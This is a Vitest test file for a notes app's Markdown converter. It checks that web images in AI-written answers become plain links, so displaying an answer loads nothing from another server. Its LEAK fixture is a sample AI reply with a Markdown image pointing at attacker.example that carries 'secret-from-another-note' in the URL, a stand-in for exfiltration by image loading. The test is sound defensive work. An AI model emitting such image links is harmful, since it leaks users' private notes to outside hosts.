// Text Foli AI wrote is read with remoteImages "link": an image from the web becomes a link to it, so showing the
// answer never loads anything from another server (docs/SECURITY_PLAN.md P0.2). Notes people import keep images.
import { describe, expect, test } from "vitest";
import { markdownToBlocks } from "../src";

const LEAK = "Here you go.\n\n![chart](https://attacker.example/pixel.png?d=secret-from-another-note)\n";

describe("remote images", () => {
  test("by default an image from the web stays an image (imports, pasted Markdown)", () => {
    const { blocks } = markdownToBlocks(LEAK, { titleFromHeading: false });
    expect(blocks.map((b) => b.type)).toEqual(["paragraph", "image"]);
    expect(blocks[1]!.props).toMatchObject({ url: "https://attacker.example/pixel.png?d=secret-from-another-note" });
  });

  test("with remoteImages: link, it becomes a link labelled with its alt text, and no image block is left", () => {
    const { blocks } = markdownToBlocks(LEAK, { titleFromHeading: false, remoteImages: "link" });
    expect(blocks.map((b) => b.type)).toEqual(["paragraph", "paragraph"]);
    expect(blocks[1]!.text).toEqual([{ type: "text", text: "chart", marks: [{ type: "link", href: "https://attacker.example/pixel.png?d=secret-from-another-note" }] }]);
    // No alt text: "Image".
    const bare = markdownToBlocks("![](https://attacker.example/x.png)", { titleFromHeading: false, remoteImages: "link" }).blocks;
    expect(bare[0]!.text[0]).toMatchObject({ text: "Image" });
  });

  test("an image of the note's own files is unaffected", () => {
    const { blocks } = markdownToBlocks("![logo](logo.png)", { titleFromHeading: false, remoteImages: "link", resolveImage: (src) => (src === "logo.png" ? { fileId: "f1" } : null) });
    expect(blocks[0]).toMatchObject({ type: "image", props: { fileId: "f1" } });
  });
});
